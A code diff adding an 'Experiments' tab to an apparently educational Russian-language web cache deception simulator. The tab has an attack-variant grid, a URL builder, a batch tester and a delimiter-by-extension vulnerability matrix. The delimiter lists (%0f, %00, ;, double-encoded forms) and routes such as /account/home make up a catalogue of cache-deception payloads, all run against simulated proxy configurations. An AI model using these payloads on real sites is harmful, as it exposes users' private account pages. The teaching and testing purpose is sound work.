+  }, [selectedCategory, proxyConfig, backendConfig])
+
+  const vulnerabilityMatrix = useMemo(() => {
+    const matrixDelimiters = ['%0f', '%0a', '%0d', '%00', ';', '%1f', '%0b', '%0c', '%09']
+    const matrixExtensions = ['css', 'js', 'png', 'jpg', 'gif', 'svg', 'ico', 'woff', 'woff2']
+    const baseRoute = '/account/home'
+
+    const data: Record<string, Record<string, boolean>> = {}
+    for (const delim of matrixDelimiters) {
+      data[delim] = {}
+      for (const ext of matrixExtensions) {
+        const url = `${baseRoute}${delim}.${ext}`
+        const parsed = parseUrlWithConfigs(url, proxyConfig, backendConfig)
+        data[delim][ext] = parsed.isVulnerable
+      }
+    }
+
+    return { delimiters: matrixDelimiters, extensions: matrixExtensions, data }
+  }, [proxyConfig, backendConfig])
+
   return (
     <div className="max-w-6xl mx-auto px-3 sm:px-4 lg:px-6 py-6 sm:py-8">
       {/* Header */}
@@ -1794,8 +2040,8 @@ export function LabView() {
       </div>
 
       {/* Main Tabs */}
-      <Tabs defaultValue="config" className="space-y-4 sm:space-y-5">
-        <TabsList className="w-full grid grid-cols-3 h-9 sm:h-10">
+      <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-4 sm:space-y-5">
+        <TabsList className="w-full grid grid-cols-4 h-9 sm:h-10">
           <TabsTrigger value="config" className="text-xs sm:text-sm gap-1 sm:gap-1.5">
             <Settings className="h-3.5 w-3.5" />
             <span className="hidden sm:inline">Конфигурация</span>
@@ -1809,6 +2055,11 @@ export function LabView() {
           <TabsTrigger value="sandbox" className="text-xs sm:text-sm gap-1 sm:gap-1.5">
             <Terminal className="h-3.5 w-3.5" />
             <span>Песочница</span>
+          </TabsTrigger>
+          <TabsTrigger value="experiments" className="text-xs sm:text-sm gap-1 sm:gap-1.5">
+            <Beaker className="h-3.5 w-3.5" />
+            <span className="hidden sm:inline">Эксперименты</span>
+            <span className="sm:hidden">Эксп</span>
           </TabsTrigger>
         </TabsList>
 
@@ -2033,18 +2284,18 @@ export function LabView() {
               <div className="mt-2.5 sm:mt-3">
                 <p className="text-[10px] sm:text-xs text-muted-foreground mb-1.5 sm:mb-2">Примеры URL:</p>
                 <div className="flex flex-wrap gap-1.5 sm:gap-2">
-                  {EXAMPLE_URLS.map((ex) => (
+                  {ATTACK_VARIANTS.filter(v => v.category === 'basic' || (v.category === 'delimiter' && v.extension === 'css')).slice(0, 6).map((v) => (
                     <button
-                      key={ex.url}
-                      onClick={() => setUrlInput(ex.url)}
+                      key={v.url}
+                      onClick={() => setUrlInput(v.url)}
                       className="inline-flex items-center gap-1 sm:gap-1.5 px-2 sm:px-2.5 py-1 rounded-md text-[10px] sm:text-xs font-mono border border-border hover:border-emerald-500/30 hover:bg-emerald-500/5 transition-colors"
                     >
-                      {ex.vulnerable ? (
+                      {v.severity !== 'safe' ? (
                         <AlertTriangle className="h-2.5 w-2.5 sm:h-3 sm:w-3 text-red-400" />
                       ) : (
                         <CheckCircle2 className="h-2.5 w-2.5 sm:h-3 sm:w-3 text-emerald-400" />
                       )}
-                      <span className="text-muted-foreground">{ex.label}</span>
+                      <span className="text-muted-foreground">{v.label}</span>
                     </button>
                   ))}
                 </div>
@@ -2363,6 +2614,381 @@ export function LabView() {
               )}
             </div>
           </div>
+        </TabsContent>
+
+        {/* ──────────── TAB 4: Experiments ──────────── */}
+        <TabsContent value="experiments" className="space-y-4 sm:space-y-5">
+          {/* Header */}
+          <Card className="border-border">
+            <CardContent className="p-3 sm:p-4">
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+                <div>
+                  <p className="text-xs sm:text-sm font-medium text-foreground mb-1">Эксперименты с вариантами атак</p>
+                  <p className="text-[10px] sm:text-xs text-muted-foreground">
+                    Исследуйте {ATTACK_VARIANTS.length} вариантов атак WCD для текущей конфигурации: Прокси{' '}
+                    <code className="text-amber-400">{proxyConfig.type}</code>, Backend{' '}
+                    <code className="text-blue-400">{backendConfig.type}</code>
+                  </p>
+                </div>
+                <div className="flex items-center gap-2">
+                  <Badge className="text-[10px] sm:text-xs bg-emerald-500/10 text-emerald-400 border-emerald-500/20">
+                    <LayoutGrid className="h-3 w-3 mr-1" />
+                    {filteredVariants.length} вариантов
+                  </Badge>
+                </div>
+              </div>
+            </CardContent>
+          </Card>
+
+          {/* Category filter */}
+          <Card className="border-border">
+            <CardHeader className="p-3 sm:p-4 pb-2">
+              <div className="flex items-center gap-2">
+                <Filter className="h-4 w-4 text-cyan-400" />
+                <CardTitle className="text-sm sm:text-base font-semibold">Фильтр по категории</CardTitle>
+              </div>
+            </CardHeader>
+            <CardContent className="px-3 sm:px-4 pb-3 sm:pb-4">
+              <div className="flex flex-wrap gap-1.5 sm:gap-2">
+                {[
+                  { key: 'all', label: 'Все', count: ATTACK_VARIANTS.length },
+                  { key: 'basic', label: 'Базовые', count: categoryCounts['basic'] || 0 },
+                  { key: 'delimiter', label: 'Разделители', count: categoryCounts['delimiter'] || 0 },
+                  { key: 'encoding', label: 'Кодировка', count: categoryCounts['encoding'] || 0 },
+                  { key: 'path-manipulation', label: 'Путь', count: categoryCounts['path-manipulation'] || 0 },
+                  { key: 'double-encoding', label: 'Двойное кодир.', count: categoryCounts['double-encoding'] || 0 },
+                  { key: 'extension-spoofing', label: 'Подмена расшир.', count: categoryCounts['extension-spoofing'] || 0 },
+                  { key: 'query-based', label: 'Query', count: categoryCounts['query-based'] || 0 },
+                  { key: 'advanced', label: 'Продвинутые', count: categoryCounts['advanced'] || 0 },
+                ].map(({ key, label, count }) => (
+                  <Button
+                    key={key}
+                    variant={selectedCategory === key ? 'default' : 'outline'}
+                    size="sm"
+                    onClick={() => { setSelectedCategory(key); setBatchResults(null) }}
+                    className={`text-[10px] sm:text-xs h-7 sm:h-8 min-w-[44px] ${selectedCategory === key ? 'bg-cyan-500/20 text-cyan-400 border-cyan-500/30 hover:bg-cyan-500/30' : ''}`}
+                  >
+                    {label}
+                    <span className="ml-1 opacity-60">({count})</span>
+                  </Button>
+                ))}
+              </div>
+            </CardContent>
+          </Card>
+
+          {/* Attack variant grid */}
+          <div>
+            <h3 className="text-sm sm:text-base font-semibold flex items-center gap-2 mb-3">
+              <Crosshair className="h-4 w-4 text-red-400" />
+              Варианты атак
+            </h3>
+            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2 sm:gap-3 max-h-[420px] overflow-y-auto pr-1" style={{ scrollbarWidth: 'thin' }}>
+              {filteredVariants.map((variant) => {
+                const severityColors: Record<string, string> = {
+                  critical: 'bg-red-500/10 text-red-400 border-red-500/20',
+                  high: 'bg-orange-500/10 text-orange-400 border-orange-500/20',
+                  medium: 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20',
+                  low: 'bg-blue-500/10 text-blue-400 border-blue-500/20',
+                  safe: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20',
+                }
+                const categoryColors: Record<string, string> = {
+                  basic: 'bg-muted text-muted-foreground',
+                  delimiter: 'bg-red-500/10 text-red-400',
+                  encoding: 'bg-orange-500/10 text-orange-400',
+                  'path-manipulation': 'bg-yellow-500/10 text-yellow-600',
+                  'double-encoding': 'bg-purple-500/10 text-purple-400',
+                  'extension-spoofing': 'bg-cyan-500/10 text-cyan-400',
+                  'query-based': 'bg-blue-500/10 text-blue-400',
+                  advanced: 'bg-rose-500/10 text-rose-400',
+                }
+                const categoryLabels: Record<string, string> = {
+                  basic: 'Базовый',
+                  delimiter: 'Разделитель',
+                  encoding: 'Кодировка',
+                  'path-manipulation': 'Путь',
+                  'double-encoding': 'Двойн.кодир.',
+                  'extension-spoofing': 'Подмена',
+                  'query-based': 'Query',
+                  advanced: 'Продвинутый',
+                }
+                return (
+                  <button
+                    key={variant.url}
+                    onClick={() => {
+                      setSelectedVariant(variant)
+                      setUrlInput(variant.url)
+                      setSandboxUrl(variant.url)
+                    }}
+                    className={`text-left p-2.5 sm:p-3 rounded-lg border transition-all hover:shadow-md min-h-[44px] ${
+                      selectedVariant?.url === variant.url
+                        ? 'border-cyan-500/40 bg-cyan-500/5 shadow-md shadow-cyan-500/5'
+                        : 'border-border bg-card hover:border-cyan-500/20'
+                    }`}
+                  >
+                    <div className="flex items-start gap-2 mb-1.5">
+                      <code className="text-[10px] sm:text-xs font-mono text-foreground break-all flex-1 leading-relaxed">
+                        {variant.url}
+                      </code>
+                    </div>
+                    <div className="flex flex-wrap items-center gap-1.5 mb-1.5">
+                      <Badge className={`text-[9px] sm:text-[10px] px-1.5 py-0 h-4 sm:h-5 ${categoryColors[variant.category] || ''} border-0`}>
+                        {categoryLabels[variant.category] || variant.category}
+                      </Badge>
+                      <Badge className={`text-[9px] sm:text-[10px] px-1.5 py-0 h-4 sm:h-5 ${severityColors[variant.severity] || ''} border-0`}>
+                        {variant.severity === 'critical' ? '☠ Критич.' :
+                         variant.severity === 'high' ? '⚠ Высокий' :
+                         variant.severity === 'medium' ? '◉ Средний' :
+                         variant.severity === 'low' ? '◦ Низкий' : '✓ Безоп.'}
+                      </Badge>
+                    </div>
+                    <p className="text-[10px] sm:text-xs text-muted-foreground leading-snug line-clamp-2">
+                      {variant.description}
+                    </p>
+                  </button>
+                )
+              })}
+            </div>
+          </div>
+
+          {/* URL Builder */}
+          <Card className="border-cyan-500/20">
+            <CardHeader className="p-3 sm:p-4 pb-2">
+              <div className="flex items-center gap-2">
+                <Target className="h-4 w-4 text-cyan-400" />
+                <CardTitle className="text-sm sm:text-base font-semibold">Конструктор URL</CardTitle>
+              </div>
+            </CardHeader>
+            <CardContent className="px-3 sm:px-4 pb-3 sm:pb-4 space-y-3">
+              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
+                {/* Route select */}
+                <div>
+                  <label className="text-[10px] sm:text-xs font-medium text-muted-foreground mb-1.5 block">Маршрут</label>
+                  <select
+                    value={builderRoute}
+                    onChange={(e) => setBuilderRoute(e.target.value)}
+                    className="w-full h-9 sm:h-10 rounded-md border border-border bg-background px-3 text-xs sm:text-sm font-mono focus:outline-none focus:ring-2 focus:ring-cyan-500/30"
+                  >
+                    <option value="/account/home">/account/home</option>
+                    <option value="/api/user">/api/user</option>
+                    <option value="/profile">/profile</option>
+                    <option value="/dashboard">/dashboard</option>
+                    <option value="/settings">/settings</option>
+                  </select>
+                </div>
+                {/* Delimiter select */}
+                <div>
+                  <label className="text-[10px] sm:text-xs font-medium text-muted-foreground mb-1.5 block">Разделитель</label>
+                  <select
+                    value={builderDelimiter}
+                    onChange={(e) => setBuilderDelimiter(e.target.value)}
+                    className="w-full h-9 sm:h-10 rounded-md border border-border bg-background px-3 text-xs sm:text-sm font-mono focus:outline-none focus:ring-2 focus:ring-cyan-500/30"
+                  >
+                    <option value="">Без разделителя</option>
+                    <option value="%0f">%0f (Shift In)</option>
+                    <option value="%0a">%0a (LF)</option>
+                    <option value="%0d">%0d (CR)</option>
+                    <option value="%00">%00 (Null)</option>
+                    <option value=";">; (Semicolon)</option>
+                    <option value="%1f">%1f (Unit Sep)</option>
+                    <option value="%0b">%0b (VTab)</option>
+                    <option value="%0c">%0c (Form Feed)</option>
+                    <option value="%09">%09 (Tab)</option>
+                    <option value="%23">%23 (#)</option>
+                    <option value="%3F">%3F (?)</option>
+                    <option value="%250f">%250f (2× %0f)</option>
+                    <option value="%2500">%2500 (2× %00)</option>
+                    <option value="%250a">%250a (2× %0a)</option>
+                  </select>
+                </div>
+                {/* Extension select */}
+                <div>
+                  <label className="text-[10px] sm:text-xs font-medium text-muted-foreground mb-1.5 block">Расширение</label>
+                  <select
+                    value={builderExtension}
+                    onChange={(e) => setBuilderExtension(e.target.value)}
+                    className="w-full h-9 sm:h-10 rounded-md border border-border bg-background px-3 text-xs sm:text-sm font-mono focus:outline-none focus:ring-2 focus:ring-cyan-500/30"
+                  >
+                    <option value="">Без расширения</option>
+                    <option value="css">.css</option>
+                    <option value="js">.js</option>
+                    <option value="png">.png</option>
+                    <option value="jpg">.jpg</option>
+                    <option value="gif">.gif</option>
+                    <option value="svg">.svg</option>
+                    <option value="ico">.ico</option>
+                    <option value="woff">.woff</option>
+                    <option value="woff2">.woff2</option>
+                    <option value="ttf">.ttf</option>
+                    <option value="mp4">.mp4</option>
+                    <option value="webm">.webm</option>
+                  </select>
+                </div>
+              </div>
+              {/* URL preview */}
+              <div className="p-2.5 sm:p-3 rounded-lg bg-muted/50 border border-border">
+                <p className="text-[10px] sm:text-xs text-muted-foreground mb-1">Предпросмотр URL:</p>
+                <code className="text-xs sm:text-sm font-mono text-cyan-400 break-all">{buildCustomUrl()}</code>
+              </div>
+              <Button
+                onClick={() => {
+                  const url = buildCustomUrl()
+                  setUrlInput(url)
+                  setSandboxUrl(url)
+                  setActiveTab('simulation')
+                }}
+                className="w-full bg-gradient-to-r from-cyan-500 to-emerald-500 hover:from-cyan-600 hover:to-emerald-600 text-white text-xs sm:text-sm"
+              >
+                <Play className="h-3.5 w-3.5 sm:h-4 sm:w-4 mr-1 sm:mr-2" />
+                Запустить в симуляции
+              </Button>
+            </CardContent>
+          </Card>
+
+          {/* Batch test */}
+          <Card className="border-amber-500/20">
+            <CardHeader className="p-3 sm:p-4 pb-2">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <Zap className="h-4 w-4 text-amber-400" />
+                  <CardTitle className="text-sm sm:text-base font-semibold">Пакетное тестирование</CardTitle>
+                </div>
+                <Button
+                  onClick={runBatchTest}
+                  disabled={isBatchRunning}
+                  size="sm"
+                  className="bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-600 hover:to-orange-600 text-white text-xs sm:text-sm"
+                >
+                  <Zap className="h-3.5 w-3.5 mr-1" />
+                  {isBatchRunning ? 'Тестирование...' : 'Протестировать все варианты'}
+                </Button>
+              </div>
+            </CardHeader>
+            <CardContent className="px-3 sm:px-4 pb-3 sm:pb-4">
+              {isBatchRunning && (
+                <div className="mb-3">
+                  <div className="h-2 rounded-full bg-muted overflow-hidden">
+                    <div
+                      className="h-full bg-gradient-to-r from-amber-500 to-orange-500 transition-all duration-200 rounded-full"
+                      style={{ width: `${batchResults ? Object.keys(batchResults).length / filteredVariants.length * 100 : 0}%` }}
+                    />
+                  </div>
+                  <p className="text-[10px] sm:text-xs text-muted-foreground mt-1">
+                    Проверено: {batchResults ? Object.keys(batchResults).length : 0} / {filteredVariants.length}
+                  </p>
+                </div>
+              )}
+              {batchResults && (
+                <div className="max-h-64 overflow-y-auto" style={{ scrollbarWidth: 'thin' }}>
+                  <div className="space-y-1">
+                    {filteredVariants.map((variant) => {
+                      const isVuln = batchResults[variant.url]
+                      return (
+                        <div
+                          key={variant.url}
+                          className={`flex items-center gap-2 p-1.5 sm:p-2 rounded text-[10px] sm:text-xs ${
+                            isVuln ? 'bg-red-500/5 border border-red-500/10' : 'bg-emerald-500/5 border border-emerald-500/10'
+                          }`}
+                        >
+                          {isVuln ? (
+                            <XCircle className="h-3.5 w-3.5 text-red-400 shrink-0" />
+                          ) : (
+                            <CheckCircle2 className="h-3.5 w-3.5 text-emerald-400 shrink-0" />
+                          )}
+                          <code className="font-mono text-muted-foreground flex-1 truncate">{variant.url}</code>
+                          <Badge className={`text-[9px] sm:text-[10px] px-1.5 py-0 h-4 sm:h-5 border-0 ${
+                            isVuln ? 'bg-red-500/10 text-red-400' : 'bg-emerald-500/10 text-emerald-400'
+                          }`}>
+                            {isVuln ? 'Уязвим' : 'Безопасен'}
+                          </Badge>
+                        </div>
+                      )
+                    })}
+                  </div>
+                  <div className="mt-3 p-2.5 rounded-lg bg-muted/50 border border-border">
+                    <p className="text-[10px] sm:text-xs text-muted-foreground">
+                      Итого: {Object.values(batchResults).filter(Boolean).length} уязвимых из{' '}
+                      {Object.keys(batchResults).length} проверенных для {proxyConfig.type} + {backendConfig.type}
+                    </p>
+                  </div>
+                </div>
+              )}
+              {!batchResults && !isBatchRunning && (
+                <p className="text-[10px] sm:text-xs text-muted-foreground text-center py-4">
+                  Нажмите «Протестировать все варианты» для проверки всех URL текущей категории
+                </p>
+              )}
+            </CardContent>
+          </Card>
+
+          {/* Vulnerability Matrix */}
+          <Card className="border-border">
+            <CardHeader className="p-3 sm:p-4 pb-2">
+              <div className="flex items-center gap-2">
+                <LayoutGrid className="h-4 w-4 text-emerald-400" />
+                <CardTitle className="text-sm sm:text-base font-semibold">Матрица уязвимостей</CardTitle>
+              </div>
+              <p className="text-[10px] sm:text-xs text-muted-foreground mt-1">
+                Разделители × Расширения для маршрута /account/home ({proxyConfig.type} + {backendConfig.type})
+              </p>
+            </CardHeader>
+            <CardContent className="px-3 sm:px-4 pb-3 sm:pb-4">
+              <div className="overflow-x-auto -mx-3 sm:mx-0">
+                <table className="w-full text-[10px] sm:text-xs border-collapse min-w-[480px]">
+                  <thead>
+                    <tr>
+                      <th className="p-1.5 sm:p-2 text-left text-muted-foreground font-medium border border-border bg-muted/30 sticky left-0 z-10 bg-background">
+                        Разделитель
+                      </th>
+                      {vulnerabilityMatrix.extensions.map(ext => (
+                        <th key={ext} className="p-1.5 sm:p-2 text-center text-muted-foreground font-medium border border-border bg-muted/30">
+                          .{ext}
+                        </th>
+                      ))}
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {vulnerabilityMatrix.delimiters.map(delim => (
+                      <tr key={delim}>
+                        <td className="p-1.5 sm:p-2 font-mono text-muted-foreground border border-border bg-muted/20 sticky left-0 z-10 bg-background whitespace-nowrap">
+                          {delim}
+                        </td>
+                        {vulnerabilityMatrix.extensions.map(ext => {
+                          const isVuln = vulnerabilityMatrix.data[delim]?.[ext]
+                          const isCached = proxyConfig.cacheStaticExts.includes(ext)
+                          return (
+                            <td
+                              key={`${delim}-${ext}`}
+                              className={`p-1.5 sm:p-2 text-center border border-border ${
+                                isVuln
+                                  ? 'bg-red-500/20 text-red-400 font-semibold'
+                                  : isCached
+                                    ? 'bg-emerald-500/10 text-emerald-400'
+                                    : 'bg-muted/30 text-muted-foreground/40'
+                              }`}
+                              title={isVuln ? `Уязвим: ${delim}.${ext}` : isCached ? 'Безопасен' : 'Не кэшируется'}
+                            >
+                              {isVuln ? '✗' : isCached ? '✓' : '—'}
+                            </td>
+                          )
+                        })}
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              </div>
+              <div className="mt-3 flex flex-wrap gap-3 text-[10px] sm:text-xs text-muted-foreground">
+                <span className="flex items-center gap-1">
+                  <span className="inline-block w-3 h-3 rounded bg-red-500/20 border border-red-500/30" /> ✗ Уязвим
+                </span>
+                <span className="flex items-center gap-1">
+                  <span className="inline-block w-3 h-3 rounded bg-emerald-500/10 border border-emerald-500/30" /> ✓ Безопасен
+                </span>
+                <span className="flex items-center gap-1">
+                  <span className="inline-block w-3 h-3 rounded bg-muted/30 border border-border" /> — Не кэшируется
+                </span>
+              </div>
+            </CardContent>
+          </Card>
         </TabsContent>
       </Tabs>
     </div>
